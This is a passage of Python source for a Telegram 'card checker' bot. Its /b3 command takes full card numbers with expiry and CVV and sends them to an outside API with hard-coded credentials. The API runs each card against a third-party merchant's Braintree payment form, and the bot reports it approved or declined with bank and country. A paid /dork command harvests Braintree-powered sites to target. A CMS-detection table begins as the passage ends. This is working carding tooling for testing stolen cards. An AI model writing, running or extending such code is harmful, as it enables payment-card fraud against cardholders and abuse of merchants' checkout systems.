    check_mark = "✅" if "successful" in response_text.lower() else "❌"

    # --- Developer info ---
    DEVELOPER_NAME = "kคli liຖนxx"
    DEVELOPER_LINK = "https://t.me/Kalinuxxx"
    developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

    elapsed_time = round(time.time() - start_time, 2)
    escaped_card = html.escape(card_data)

    # --- Final formatted message ---
    final_text = (
        f"<b><i>3D Secure / VBV Lookup</i></b>\n\n"
        f"𝐂𝐚𝐫𝐝 ➵ <code>{escaped_card}</code>\n"
        f"𝐁𝐈𝐍 ➵ <code>{bin_number}</code>\n"
        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{html.escape(response_text)} {check_mark}</code></i>\n\n"
        f"<pre>"
        f"𝐁𝐫𝐚𝐧𝐝 ➵ {html.escape(brand)}\n"
        f"𝐁𝐚𝐧𝐤 ➵ {html.escape(issuer)}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {html.escape(country_name)} {country_flag}"
        f"</pre>\n\n"
        f"𝐃𝐞𝐯 ➵ {developer_clickable}\n"
        f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
    )

    await msg.edit_text(final_text, parse_mode="HTML", disable_web_page_preview=True)



import time
import logging
import aiohttp
import asyncio
import html
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user  # credit system
import re

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

# Try to import your BIN lookup helper; provide a safe fallback if absent
try:
    from bin import get_bin_info
except Exception:
    async def get_bin_info(bin_number: str) -> dict:
        return {"scheme": None, "bank": None, "country": None, "country_emoji": ""}


# --- Cooldown and API config ---
BASE_COOLDOWN = 5
COOLDOWN_SECONDS = BASE_COOLDOWN

# --- New API (autoxmaster) config ---
API_URL = "https://autoxmaster.onrender.com/lbt"
API_KEY = "Xcracker911"
API_USER = "rocky"
API_PASS = "Rocky@10010"
SITE = "https://disciplinedfinancialmanagement.com"
API_TIMEOUT_SECONDS = 50


# --- Credit System ---
async def consume_credit(user_id: int) -> bool:
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            await update_user(user_id, credits=user_data["credits"] - 1)
            return True
    except Exception as e:
        logger.warning(f"[consume_credit] Error updating user {user_id}: {e}")
    return False


# --- Regex for multiple card formats ---
FLEX_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

def normalize_card(text: str | None) -> str | None:
    if not text:
        return None
    match = FLEX_CARD_REGEX.search(text)
    if not match:
        return None
    cc, mm, yy, cvv = match.groups()
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    return f"{cc}|{mm}|{yy}|{cvv}"


# --- Cooldown tracker ---
user_last_command_time: dict[int, float] = {}


async def b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    current_time = time.time()

    # --- Extract CC ---
    input_text = None
    if context.args:
        input_text = " ".join(context.args).strip()
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        input_text = update.message.reply_to_message.text.strip()

    card_data = normalize_card(input_text) if input_text else None
    if not card_data:
        await update.message.reply_text(
            "⚠️ <b>Usage:</b>\n"
            "<code>/b3 4111111111111111|07|2027|123</code>\n\n",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Cooldown check ---
    if user_id in user_last_command_time:
        elapsed = current_time - user_last_command_time[user_id]
        if elapsed < COOLDOWN_SECONDS:
            remaining = round(COOLDOWN_SECONDS - elapsed, 1)
            await update.message.reply_text(
                f"⏳ Please wait <b>{remaining}s</b> before using /b3 again.",
                parse_mode=ParseMode.HTML
            )
            return
    user_last_command_time[user_id] = current_time

    # --- Credit check ---
    credit_ok = await consume_credit(user.id)
    if not credit_ok:
        await update.message.reply_text(
            "⚠️ <b>No Credits Left!</b>\n\n"
            "Please recharge your balance to continue using <b>/b3</b>.",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Processing message ---
    processing_text = (
        f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
        f"<pre><code>{escape(card_data)}</code></pre>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙪𝙩𝙝\n"
    )
    processing_msg = await update.message.reply_text(
        processing_text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    asyncio.create_task(run_braintree_check(user, card_data, card_data, processing_msg))


async def run_braintree_check(user, cc_input: str, full_card: str, processing_msg):
    start_time = time.time()
    developer_clickable = '<a href="https://t.me/Kalinuxxx">kคli liຖนxx</a>'

    try:
        timeout = aiohttp.ClientTimeout(total=API_TIMEOUT_SECONDS)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            params = {
                "key": API_KEY,
                "site": SITE,
                "cc": cc_input,
                "username": API_USER,
                "password": API_PASS,
            }
            try:
                async with session.get(API_URL, params=params) as resp:
                    if resp.status != 200:
                        await processing_msg.edit_text(
                            f"❌ API returned HTTP {resp.status}",
                            parse_mode=ParseMode.HTML
                        )
                        return
                    try:
                        data = await resp.json(content_type=None)
                    except Exception:
                        text = await resp.text()
                        await processing_msg.edit_text(
                            f"❌ Failed parsing API response:\n<code>{escape(text)}</code>",
                            parse_mode=ParseMode.HTML
                        )
                        return
            except Exception as e:
                await processing_msg.edit_text(
                    f"❌ Request error:\n<code>{escape(str(e))}</code>",
                    parse_mode=ParseMode.HTML
                )
                return
    except asyncio.TimeoutError:
        await processing_msg.edit_text(
            f"❌ Request timed out after {API_TIMEOUT_SECONDS} seconds.",
            parse_mode=ParseMode.HTML
        )
        return
    except Exception as e:
        await processing_msg.edit_text(
            f"❌ Network/API error:\n<code>{escape(str(e))}</code>",
            parse_mode=ParseMode.HTML
        )
        return

    # --- parse response ---
    cc = data.get("cc", cc_input) if isinstance(data, dict) else cc_input
    status_raw = str(data.get("status", "")).upper() if isinstance(data, dict) else ""
    response_text = data.get("response", "") if isinstance(data, dict) else ""
    proxy_info = data.get("proxy", "") if isinstance(data, dict) else ""

    # --- Status mapping ---
    if status_raw in ("APPROVED", "APPROVE", "CHARGED", "OK", "SUCCESS"):
        header_status = "✅ Approved"
    elif status_raw == "CCN":
        header_status = "❎CCN"
    else:
        header_status = "❌ Declined"

    # --- BIN lookup ---
    try:
        bin_number = cc.split("|")[0][:6]
        bin_details = await get_bin_info(bin_number) or {}
        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = bin_details.get("bank") or "N/A"
        country_name = bin_details.get("country") or "Unknown"
        country_flag = bin_details.get("country_emoji", "")
    except Exception:
        brand = issuer = "N/A"
        country_name = "Unknown"
        country_flag = ""

    # --- requester and elapsed ---
    full_name = " ".join(filter(None, [user.first_name, user.last_name]))
    requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
    elapsed_time = round(time.time() - start_time, 2)

    # --- final message ---
    final_msg = (
        f"<b><i>{header_status}</i></b>\n\n"
        f"𝐂𝐚𝐫𝐝 ➵ <code>{html.escape(full_card)}</code>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝘽𝙧𝙖𝙞𝙣𝙩𝙧𝙚𝙚 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙪𝙩𝙝\n"
        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{escape(response_text)}</code></i>\n\n"
        f"<pre>"
        f"𝐁𝐫𝐚𝐧𝐝 ➵ {escape(brand)}\n"
        f"𝐁𝐚𝐧𝐤 ➵ {escape(issuer)}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {escape(country_name)} {country_flag}\n"
        f"</pre>\n\n"
        f"𝐃𝐞𝐯 ➵ {developer_clickable}\n"
        f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
    )

    try:
        await processing_msg.edit_text(
            final_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )
    except Exception:
        logger.exception("Error editing final message")




# /adserp handler — validate using rockysoon dorker API, store per-user SearchApi.io key (reject duplicates)
import logging
import aiohttp
import asyncio
from urllib.parse import quote_plus
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

# DB helpers (from your project)
# - async def set_serp_key(user_id: int, key: str) -> bool
# - async def serp_key_exists(key: str, exclude_user: int = None) -> bool
from db import set_serp_key, serp_key_exists

logger = logging.getLogger(__name__)

# Test dork (low-noise)
_TEST_DORK = 'intext:"Powered by Braintree"'

# Use your dorker API base (the URL you provided)
DORKER_API_BASE = "https://rockysoon.onrender.com/gateway=dorker/masterkey=rockyog/dork="
_TEST_TIMEOUT = 12  # seconds

async def _test_key_against_dorker(api_key: str, timeout: int = _TEST_TIMEOUT) -> (bool, str):
    """
    Calls your rockysoon dorker API with the test dork and the provided key.
    Expects JSON like: {"urls": [...], "total": N, ...}
    Returns (ok: bool, reason: str)
    """
    encoded_dork = quote_plus(_TEST_DORK)
    encoded_key = quote_plus(api_key)
    url = f"{DORKER_API_BASE}{encoded_dork}/key={encoded_key}"

    timeout_cfg = aiohttp.ClientTimeout(total=timeout)
    async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
        try:
            async with session.get(url) as resp:
                status = resp.status
                text = await resp.text()

                # try JSON parse (be permissive)
                try:
                    j = await resp.json(content_type=None)
                except Exception:
                    import json
                    try:
                        j = json.loads(text)
                    except Exception:
                        j = None

                # HTTP-level errors
                if status >= 400:
                    if status in (401, 403):
                        return False, "invalid_or_unauthorized"
                    if status == 429:
                        return False, "rate_limited"
                    return False, f"http_error_{status}"

                if not isinstance(j, dict):
                    return False, "invalid_response"

                # Expect 'urls' list or 'total'
                urls = j.get("urls") if isinstance(j.get("urls"), list) else []
                total = int(j.get("total", len(urls) if urls is not None else 0))

                # blank / empty result likely indicates exhausted credits or invalid key
                if (not urls) and total == 0:
                    return False, "blank_results"

                if urls and len(urls) > 0:
                    return True, ""

                return False, "blank_results"

        except asyncio.TimeoutError:
            return False, "timeout"
        except Exception as e:
            logger.exception("Unexpected error validating key against dorker: %s", e)
            return False, "request_exception"


async def adserp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Usage:
      /adserp YOUR_SEARCHAPI_KEY

    Saves the given SearchApi.io key to the calling user's account.
    - Rejects keys already registered to other users.
    - Validates the key by calling your rockysoon dorker API with a small test dork.
    - If validation fails (blank results / http error / timeout) informs the user.
    """
    user = update.effective_user
    user_id = user.id
    args = context.args or []

    # Button to get a key from SearchApi.io
    get_key_kb = InlineKeyboardMarkup(
        [[InlineKeyboardButton("🔑 𝗚𝗲𝘁 𝘆𝗼𝘂𝗿 𝗦𝗲𝗿𝗽 𝗞𝗲𝘆", url="https://www.searchapi.io/")]]
    )

    # No args -> usage + button (stylish)
    if not args:
        await update.message.reply_text(
            "⚠️ <b>𝐔𝐬𝐚𝐠𝐞</b>\n<code>/adserp YOUR_SEARCHAPI_KEY</code>\n\n"
            "<i>You must use your own Serp key — adding another user's key is not allowed.</i>\n\n"
            "Tap the button below to get a key if you don't have one:",
            parse_mode=ParseMode.HTML,
            reply_markup=get_key_kb,
            disable_web_page_preview=True
        )
        return

    search_key = args[0].strip()

    # Basic sanity check on length
    if len(search_key) < 8:
        await update.message.reply_text(
            "⚠️ <b>Key Too Short</b>\n\n"
            "<i>Please paste a valid SearchApi.io key.</i>",
            parse_mode=ParseMode.HTML
        )
        return

    # Check duplicate (registered to someone else)
    try:
        exists = await serp_key_exists(search_key, exclude_user=user_id)
        if exists:
            await update.message.reply_text(
                "⚠️ <b>𝐊𝐞𝐲 𝐈𝐧 𝐔𝐬𝐞</b>\n\n"
                "𝗧𝗵𝗮𝘁 𝗦𝗲𝗿𝗽 𝗸𝗲𝘆 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗿𝗲𝗴𝗶𝘀𝘁𝗲𝗿𝗲𝗱 𝗯𝘆 𝗮𝗻𝗼𝘁𝗵𝗲𝗿 𝘂𝘀𝗲𝗿.\n"
                "𝗣𝗹𝗲𝗮𝘀𝗲 𝗼𝗯𝘁𝗮𝗶𝗻 𝘆𝗼𝘂𝗿 𝗼𝘄𝗻 𝗸𝗲𝘆 (𝗯𝘂𝘁𝘁𝗼𝗻 𝗯𝗲𝗹𝗼𝘄).",
                parse_mode=ParseMode.HTML,
                reply_markup=get_key_kb,
                disable_web_page_preview=True
            )
            return
    except Exception as e:
        # If DB check fails, log and continue — unique constraint on save should still protect.
        logger.exception("Error checking search_key existence (continuing): %s", e)

    # Inform user we're validating
    validating_msg = await update.message.reply_text(
        "🔐𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙨𝙚𝙧𝙥 𝙠𝙚𝙮 𝙥𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙪𝙣𝙩𝙞𝙡 𝙘𝙝𝙚𝙘𝙠𝙚𝙙.",
        parse_mode=ParseMode.HTML
    )

    ok, reason = await _test_key_against_dorker(search_key)

    if not ok:
        # user-friendly mapping
        if reason == "invalid_or_unauthorized":
            txt = (
                "❌ <b>Invalid / Unauthorized</b>\n\n"
                "That key appears invalid or unauthorized for the dorker API.\n"
                "Make sure you pasted the correct SearchApi.io key. Get a new key below:"
            )
        elif reason == "rate_limited":
            txt = (
                "❌ <b>Rate-limited</b>\n\n"
                "Your key may be temporarily restricted or throttled. Try again later or get a new key:"
            )
        elif reason == "blank_results":
            txt = (
                "❌ <b>𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗸𝗲𝘆</b>\n\n"
                "𝗧𝗵𝗲 𝘀𝗲𝗿𝗽 𝗸𝗲𝘆 𝘆𝗼𝘂 𝗽𝗿𝗼𝘃𝗶𝗱𝗲𝗱 𝗶𝘀 𝗶𝗻𝗰𝗼𝗿𝗿𝗲𝗰𝘁 𝗼𝗿 𝗖𝗿𝗲𝗱𝗶𝘁𝘀 𝗘𝘅𝗵𝗮𝘂𝘀𝘁𝗲𝗱 𝗽𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝗰𝗵𝗲𝗰𝗸 𝗼𝗿 𝗴𝗲𝘁 𝗮 𝗻𝗲𝘄 𝗼𝗻𝗲."
            )
        elif reason == "timeout":
            txt = (
                "❌ <b>Timeout</b>\n\n"
                "Validation timed out while contacting the dorker API. Try again later."
            )
        elif reason == "invalid_response":
            txt = (
                "❌ <b>Unexpected Response</b>\n\n"
                "The dorker API returned an unexpected payload. Please verify the service is healthy."
            )
        else:
            txt = (
                "❌ <b>Validation Failed</b>\n\n"
                "Failed to validate the key (network or unexpected response). Try again or get a new key:"
            )

        try:
            await validating_msg.edit_text(txt, parse_mode=ParseMode.HTML, reply_markup=get_key_kb, disable_web_page_preview=True)
        except Exception:
            await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=get_key_kb, disable_web_page_preview=True)
        return

    # Save key
    try:
        saved = await set_serp_key(user_id, search_key)
    except Exception as e:
        logger.exception("Failed to save search_key for %s: %s", user_id, e)
        try:
            await validating_msg.edit_text("❌ <b>Database Error</b>\n\nCould not save your key. Please try again later.", parse_mode=ParseMode.HTML)
        except Exception:
            await update.message.reply_text("❌ <b>Database Error</b>\n\nCould not save your key. Please try again later.", parse_mode=ParseMode.HTML)
        return

    if not saved:
        await validating_msg.edit_text(
            "⚠️ <b>Already Registered</b>\n\n"
            "That SearchApi.io key appears to be registered by another user. If you believe this is an error, contact the admin.",
            parse_mode=ParseMode.HTML
        )
        return

    # Success
    await validating_msg.edit_text(
        "✅ <b>𝐒𝐚𝐯𝐞𝐝</b>\n\n"
        "𝗬𝗼𝘂𝗿 𝗸𝗲𝘆 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝗮𝘃𝗲𝗱 𝗮𝗻𝗱 𝘄𝗶𝗹𝗹 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗳𝗼𝗿 𝗮𝗹𝗹 /𝗱𝗼𝗿𝗸 𝗾𝘂𝗲𝗿𝗶𝗲𝘀.\n\n"
        "<i>To remove the key later use <code>/rserp</code>.</i>",
        parse_mode=ParseMode.HTML
    )




# /rserp handler — remove the saved SearchApi.io key for a user
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

# DB helpers you should implement:
# - async def get_serp_key(user_id: int) -> Optional[str]
# - async def delete_serp_key(user_id: int) -> bool

from db import get_serp_key, delete_serp_key

logger = logging.getLogger(__name__)

async def rserp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Usage:
      /rserp

    Removes the SearchApi.io key saved for the calling user.
    """
    user = update.effective_user
    user_id = user.id

    try:
        current_key = await get_serp_key(user_id)
    except Exception as e:
        logger.exception("Failed to fetch serp_key for %s: %s", user_id, e)
        await update.message.reply_text(
            "❌ <b>𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐄𝐫𝐫𝐨𝐫</b>\n<i>Could not check your saved key. Please try again later.</i>",
            parse_mode=ParseMode.HTML
        )
        return

    if not current_key:
        await update.message.reply_text(
            "⚠️ <b>No Key Found</b>\n\n"
            "You don’t currently have any 𝗦𝗲𝗿𝗽 𝗞𝗲𝘆 key saved.\n"
            "Use <code>/adserp YOUR_KEY</code> to add one.",
            parse_mode=ParseMode.HTML
        )
        return

    # Attempt deletion
    try:
        ok = await delete_serp_key(user_id)
    except Exception as e:
        logger.exception("Failed to delete serp_key for %s: %s", user_id, e)
        await update.message.reply_text(
            "❌ <b>𝐃𝐞𝐥𝐞𝐭𝐢𝐨𝐧 𝐅𝐚𝐢𝐥𝐞𝐝</b>\n<i>Database error while removing your key. Please try again later.</i>",
            parse_mode=ParseMode.HTML
        )
        return

    if not ok:
        await update.message.reply_text(
            "⚠️ <b>Key Removal Issue</b>\n\n"
            "Could not remove your <b>SearchApi.io</b> key "
            "(it may have already been deleted).",
            parse_mode=ParseMode.HTML
        )
        return

    # Success message
    kb = InlineKeyboardMarkup(
        [[InlineKeyboardButton("🔑 𝗚𝗲𝘁 𝘆𝗼𝘂𝗿 𝗦𝗲𝗿𝗽 𝗞𝗲𝘆", url="https://www.searchapi.io/")]]
    )
    await update.message.reply_text(
        "✅ <b>𝐘𝐨𝐮𝐫 𝗦𝗲𝗿𝗽 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐞𝐦𝐨𝐯𝐞𝐝.</b>\n\n"
        "➕ Add a new one anytime with:\n"
        "<code>/adserp YOUR_KEY</code>\n\n"
        "<i>Don’t have a key? Click below to grab one 👇</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=kb,
        disable_web_page_preview=True
    )



# /dork command + pagination (async, python-telegram-bot v20+)
import time
import hashlib
import asyncio
import aiohttp
import html as _html
from io import BytesIO
from urllib.parse import quote_plus
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
import logging

logger = logging.getLogger(__name__)

# Config
DORK_API_BASE = "https://rockysoon.onrender.com/gateway=dorker/masterkey=rockyog/dork="
PAGE_SIZE = 5
# SESSION_TTL removed => sessions will not be auto-evicted
CLEANUP_INTERVAL = 600  # kept definition only if you reuse it elsewhere

# In-memory sessions
_DORK_SESSIONS: dict = {}

def _make_session_id(query: str, user_id: int) -> str:
    return hashlib.sha1(f"{query}|{user_id}|{time.time()}".encode()).hexdigest()[:24]

# NOTE: session cleaner removed so sessions persist until process restart.
# If you later want to re-enable automatic expiry, reintroduce SESSION_TTL and the cleaner.

# Page builder
def _build_page_text(session_id: str, page_index: int) -> str:
    s = _DORK_SESSIONS[session_id]
    urls = s.get("urls", []) or []
    total = int(s.get("total", len(urls) if urls else 0))
    start = page_index * PAGE_SIZE
    page_urls = urls[start:start + PAGE_SIZE]

    max_pages = (total - 1) // PAGE_SIZE + 1 if total else 1
    cur_page = page_index + 1

    header = "━━━━━━━━━━━━━━━━━━━━━━\n"
    header += f"<i>◆ 𝐃𝐎𝐑𝐊𝐄𝐑 𝐑𝐄𝐒𝐔𝐋𝐓𝐒 {cur_page}/{max_pages}</i>\n"
    header += "━━━━━━━━━━━━━━━━━━━━━━\n"

    lines = []
    for i in range(PAGE_SIZE):
        slot_index = start + i
        if i < len(page_urls):
            url = page_urls[i]
            lines.append(f"{slot_index+1}. <code>{_html.escape(url)}</code>")
        else:
            lines.append(f"{slot_index+1}. <code>{'─'*28}</code>")
    return header + "\n".join(lines)

# Navigation keyboard
def _build_nav_keyboard(session_id: str, page_index: int) -> InlineKeyboardMarkup:
    s = _DORK_SESSIONS[session_id]
    total = int(s.get("total", 0))
    max_pages = (total - 1) // PAGE_SIZE + 1 if total else 1

    row = []
    if page_index > 0:
        row.append(InlineKeyboardButton("⬅️ Back", callback_data=f"dork_{session_id}_{page_index-1}"))
    else:
        row.append(InlineKeyboardButton("⬅️ Back", callback_data="dork_noop"))

    if page_index < max_pages - 1:
        row.append(InlineKeyboardButton("➡️ Next", callback_data=f"dork_{session_id}_{page_index+1}"))
    else:
        row.append(InlineKeyboardButton("➡️ Next", callback_data="dork_noop"))

    file_row = [InlineKeyboardButton("📥 Get .txt", callback_data=f"dork_file_{session_id}")]
    return InlineKeyboardMarkup([row, file_row])

# Call API
async def _call_dork_api_for_user(query: str, user_id: int, timeout: int = 60) -> dict:
    """
    Default timeout set to 60 seconds as requested.
    """
    try:
        from db import get_serp_key
    except Exception as e:
        logger.exception("db.get_serp_key import failed: %s", e)
        return {"error": "NO_SERP_KEY", "urls": [], "total": 0}

    try:
        user_key = await get_serp_key(user_id)
    except Exception as e:
        logger.exception("Failed to read serp_key for user %s: %s", user_id, e)
        user_key = None

    if not user_key:
        return {"error": "NO_SERP_KEY", "urls": [], "total": 0}

    api_url = DORK_API_BASE + quote_plus(query) + f"/key={quote_plus(user_key)}"
    timeout_cfg = aiohttp.ClientTimeout(total=timeout)
    async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
        try:
            async with session.get(api_url) as resp:
                text = await resp.text()
                try:
                    return await resp.json(content_type=None)
                except Exception:
                    import json
                    try:
                        return json.loads(text)
                    except Exception:
                        logger.warning("Failed to parse JSON (user=%s).", user_id)
                        return {"urls": [], "total": 0}
        except asyncio.TimeoutError:
            return {"error": "TIMEOUT"}
        except Exception as e:
            logger.exception("Request error for user %s: %s", user_id, e)
            return {"error": "REQUEST_ERROR", "message": str(e)}

# File builder
def _build_urls_file_bytes(urls: list) -> BytesIO:
    txt = "\n".join(urls)
    bio = BytesIO()
    bio.write(txt.encode("utf-8"))
    bio.seek(0)
    bio.name = "dork_urls.txt"
    return bio

# --- /dork handler ---
async def dork(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    chat = update.effective_chat

    query = None
    if context.args:
        query = " ".join(context.args).strip()
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        query = update.message.reply_to_message.text.strip()

    if not query:
        await update.message.reply_text(
            "⚠️ <b>Usage:</b> <code>/dork your search terms</code>\n"
            "<i>Example:</i> <code>/dork login intext:\"Powered by Braintree\" inurl:/myaccount</code>",
            parse_mode=ParseMode.HTML
        )
        return

    # cooldown
    try:
        last = user_last_command_time.get(user_id)
    except Exception:
        last = None
    now = time.time()
    if last:
        elapsed = now - last
        if elapsed < COOLDOWN_SECONDS:
            remaining = round(COOLDOWN_SECONDS - elapsed, 1)
            await update.message.reply_text(
                f"⏳ <b>Please wait</b> <i>{remaining}s</i> before using /dork again.",
                parse_mode=ParseMode.HTML
            )
            return
    user_last_command_time[user_id] = now

    # credits
    try:
        credit_ok = await consume_credit(user_id)
    except Exception as e:
        logger.exception("consume_credit failed for %s: %s", user_id, e)
        credit_ok = False
    if not credit_ok:
        await update.message.reply_text(
            "⚠️ <b>You have no credits left.</b>\n<i>Recharge to use /dork.</i>",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Processing message ---
    processing_text = (
        f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
        f"<pre><code>𝗗𝗼𝗿𝗸𝗶𝗻𝗴 𝗢𝗻𝗴𝗼𝗶𝗻𝗴</code></pre>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝗗𝗼𝗿𝗸𝗲𝗿\n"
    )
    try:
        working = await update.message.reply_text(
            processing_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True
        )
    except Exception:
        working = await update.message.reply_text("🔎 Processing...")

    # call API (timeout default 60s now)
    data = await _call_dork_api_for_user(query, user_id)

    # --- error cases ---
    if data.get("error") == "NO_SERP_KEY":
        kb = InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔑 𝗚𝗲𝘁 𝘆𝗼𝘂𝗿 𝗦𝗲𝗿𝗽 𝗞𝗲𝘆", url="https://www.searchapi.io/")]]
        )
        await working.edit_text(
            "⚠️ <b>No SERP API key found!</b>\n\n"
            "<i>Get your own SerpApi key below and add it with</i> <code>/adserp YOUR_KEY</code>.",
            parse_mode=ParseMode.HTML, reply_markup=kb, disable_web_page_preview=True
        )
        return

    if data.get("error") == "TIMEOUT":
        await working.edit_text("❌ <b>Dork API timed out (60s).</b>\n<i>Please try again later.</i>", parse_mode=ParseMode.HTML)
        return

    if data.get("error") == "REQUEST_ERROR":
        await working.edit_text(
            f"❌ <b>Dork API request error:</b>\n<code>{_html.escape(data.get('message',''))}</code>",
            parse_mode=ParseMode.HTML
        )
        return

    urls = data.get("urls") if isinstance(data.get("urls"), list) else []
    total = int(data.get("total", len(urls))) if data.get("total") is not None else len(urls)

    if (not urls) and total == 0:
        kb = InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔑 𝗚𝗲𝘁 𝘆𝗼𝘂𝗿 𝗦𝗲𝗿𝗽 𝗞𝗲𝘆", url="https://www.searchapi.io/")]]
        )
        await working.edit_text(
            "⚠️ <b>Your SerpApi key returned a blank response.</b>\n\n"
            "<i>Your credits may be exhausted or the key is invalid. Get a new key below.</i>",
            parse_mode=ParseMode.HTML, reply_markup=kb, disable_web_page_preview=True
        )
        return

    # --- success ---
    session_id = _make_session_id(query, user_id)
    _DORK_SESSIONS[session_id] = {
        "query": query, "urls": urls, "total": total, "ts": time.time(), "user_id": user_id
    }

    page_idx = 0
    text = _build_page_text(session_id, page_idx)
    kb = _build_nav_keyboard(session_id, page_idx)
    await working.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_markup=kb)

# --- pagination & file handler ---
async def dork_pagination(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not q or not q.data:
        return
    data = q.data

    if data == "dork_noop":
        await q.answer()
        return

    if data.startswith("dork_file_"):
        _, _, session_id = data.partition("dork_file_")
        session = _DORK_SESSIONS.get(session_id)
        if not session:
            await q.answer(
                "⚠️ <b>Session expired.</b>\n<i>Re-run /dork.</i>",
                show_alert=True,
                parse_mode=ParseMode.HTML,
            )
            return

        urls = session.get("urls", []) or []
        if not urls:
            await q.answer(
                "⚠️ <i>No URLs to include in file.</i>",
                show_alert=True,
                parse_mode=ParseMode.HTML,
            )
            return

        bio = _build_urls_file_bytes(urls)
        try:
            # ✅ Send file in group, as reply to the original /dork message
            await context.bot.send_document(
                chat_id=q.message.chat.id,
                document=bio,
                filename=bio.name,
                caption="𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗨𝗥𝗟𝘀 (.𝘁𝘅𝘁).",
                reply_to_message_id=q.message.reply_to_message.message_id
                if q.message.reply_to_message
                else q.message.message_id,
            )
            await q.answer("📥 File sent as reply.")
        except Exception as e:
            logger.exception("Failed to send dork file: %s", e)
            await q.answer("❌ Failed to send file.", show_alert=True)
        return

    if not data.startswith("dork_"):
        return

    try:
        _, session_id, page_str = data.split("_", 2)
        page_index = int(page_str)
    except Exception:
        await q.answer("⚠️ Invalid callback")
        return

    session = _DORK_SESSIONS.get(session_id)
    if not session:
        await q.message.edit_text(
            "⚠️ <b>Session expired.</b>\n<i>Please re-run /dork.</i>",
            parse_mode=ParseMode.HTML,
        )
        await q.answer()
        return

    session["ts"] = time.time()
    new_text = _build_page_text(session_id, page_index)
    new_kb = _build_nav_keyboard(session_id, page_index)
    await q.message.edit_text(
        new_text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=new_kb,
    )
    await q.answer()










import re
import aiohttp
import asyncio
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler

# CMS patterns
CMS_PATTERNS = {
    'Shopify': r'cdn\.shopify\.com|shopify\.js',
    'BigCommerce': r'cdn\.bigcommerce\.com|bigcommerce\.com',
    'Wix': r'static\.parastorage\.com|wix\.com',
    'Squarespace': r'static1\.squarespace\.com|squarespace-cdn\.com',
    'WooCommerce': r'wp-content/plugins/woocommerce/',
    'Magento': r'static/version\d+/frontend/|magento/',
    'PrestaShop': r'prestashop\.js|prestashop/',
    'OpenCart': r'catalog/view/theme|opencart/',
    'Shopify Plus': r'shopify-plus|cdn\.shopifycdn\.net/',
    'Salesforce Commerce Cloud': r'demandware\.edgesuite\.net/',
    'WordPress': r'wp-content|wp-includes/',
    'Joomla': r'media/jui|joomla\.js',
    'Drupal': r'sites/all/modules|drupal\.js/',
